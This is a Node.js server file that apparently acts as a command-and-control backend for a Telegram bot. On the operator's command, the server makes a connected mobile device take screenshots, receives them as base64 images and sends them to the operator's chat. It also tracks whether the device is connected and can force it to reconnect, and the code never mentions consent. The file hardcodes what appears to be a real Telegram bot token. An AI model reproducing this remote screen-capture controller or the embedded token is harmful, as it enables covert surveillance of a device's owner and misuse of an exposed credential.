const { Telegraf } = require('telegraf');
const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');

const bot = new Telegraf('8185582538:AAGFy_Fy2JCjA_YVnYwjujuJMh0GSgKxHIw');
const app = express();
const server = createServer(app);

// Configure Socket.IO with CORS and ping timeout
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000
});

let connectedDevice = null;
let lastActivityTime = null;
let lastRequestedChatId = null;

// Add basic health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        deviceConnected: !!connectedDevice,
        lastActivity: lastActivityTime
    });
});

app.get('/', (req, res) => {
    res.send('Servidor funcionando');
});

// Enhanced bot commands
bot.command('start', (ctx) => {
    ctx.reply(
        '🎮 Monitor de Dispositivo Móvil\n\n' +
        'Comandos disponibles:\n' +
        '/screen - Toma una captura de pantalla\n' +
        '/estado - Muestra el estado de conexión\n' +
        '/ultimaActividad - Muestra cuando fue la última actividad\n' +
        '/reconectar - Fuerza reconexión del dispositivo'
    );
});

bot.command('screen', async (ctx) => {
    if (!connectedDevice) {
        return ctx.reply('❌ El dispositivo no está conectado');
    }
    
    lastRequestedChatId = ctx.chat.id;
    ctx.reply('📸 Solicitando captura de pantalla...');
    
    // Add timeout for screenshot request
    const timeout = setTimeout(() => {
        if (lastRequestedChatId === ctx.chat.id) {
            ctx.reply('⚠️ Tiempo de espera agotado para la captura');
            lastRequestedChatId = null;
        }
    }, 30000);
    
    io.emit('takeScreenshot');
    console.log('Solicitud de captura enviada');
});

bot.command('reconectar', (ctx) => {
    if (connectedDevice) {
        connectedDevice.disconnect(true);
        ctx.reply('🔄 Forzando reconexión del dispositivo...');
    } else {
        ctx.reply('❌ No hay dispositivo conectado para reconectar');
    }
});

// Enhanced Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('🟢 Nueva conexión recibida');
    
    socket.on('deviceConnected', (data) => {
        console.log('🟢 Dispositivo identificado:', data);
        connectedDevice = socket;
        lastActivityTime = Date.now();
        
        // Notify all admin chats about connection
        if (lastRequestedChatId) {
            bot.telegram.sendMessage(lastRequestedChatId, '🟢 Dispositivo conectado');
        }
    });
    
    socket.on('disconnect', (reason) => {
        if (connectedDevice === socket) {
            console.log('🔴 Dispositivo desconectado. Razón:', reason);
            connectedDevice = null;
            
            // Notify all admin chats about disconnection
            if (lastRequestedChatId) {
                bot.telegram.sendMessage(lastRequestedChatId, 
                    `🔴 Dispositivo desconectado\nRazón: ${reason}`);
            }
        }
    });
    
    socket.on('screenshotTaken', async (base64Image) => {
        try {
            if (!lastRequestedChatId) {
                console.error('No hay ID de chat guardado');
                return;
            }
            
            console.log('📸 Recibida imagen, tamaño:', base64Image.length);
            const imageBuffer = Buffer.from(base64Image, 'base64');
            
            await bot.telegram.sendPhoto(lastRequestedChatId, { 
                source: imageBuffer,
                caption: '✅ Captura de pantalla'
            });
            
            console.log('✅ Captura enviada exitosamente');
            lastRequestedChatId = null;
            
        } catch (error) {
            console.error('❌ Error al enviar screenshot:', error);
            if (lastRequestedChatId) {
                bot.telegram.sendMessage(lastRequestedChatId, 
                    '❌ Error al enviar la captura: ' + error.message);
            }
        }
    });
    
    socket.on('activity', (data) => {
        lastActivityTime = data.timestamp || Date.now();
        console.log('💓 Actividad recibida del dispositivo:', new Date(lastActivityTime).toISOString());
    });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor iniciado en puerto ${PORT}`);
});

bot.launch().then(() => console.log('🤖 Bot de Telegram iniciado'));

// Enhanced error handling
process.on('unhandledRejection', (error) => {
    console.error('Error no manejado:', error);
});

process.on('SIGINT', () => {
    bot.stop('SIGINT');
    server.close();
    process.exit(0);
});

process.on('SIGTERM', () => {
    bot.stop('SIGTERM');
    server.close();
    process.exit(0);
});

